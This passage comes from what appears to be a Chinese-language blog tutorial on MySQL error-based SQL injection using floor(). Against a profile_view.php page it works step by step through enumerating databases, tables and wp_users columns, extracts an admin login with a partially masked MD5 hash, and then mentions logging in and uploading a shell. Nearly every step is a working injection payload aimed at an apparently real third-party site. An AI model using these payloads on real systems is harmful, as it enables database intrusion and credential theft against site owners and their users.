-<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
-<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
-<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
-<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
-<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
-<p>直到当我查到’jamesbaird<em>current’这个库时,一眼就发现了’wp</em>‘ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
-<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
-<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
-<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
-<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</div></pre></td></tr></table></figure></p>
-<p><br></p>
-<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>
 
         </div>
     
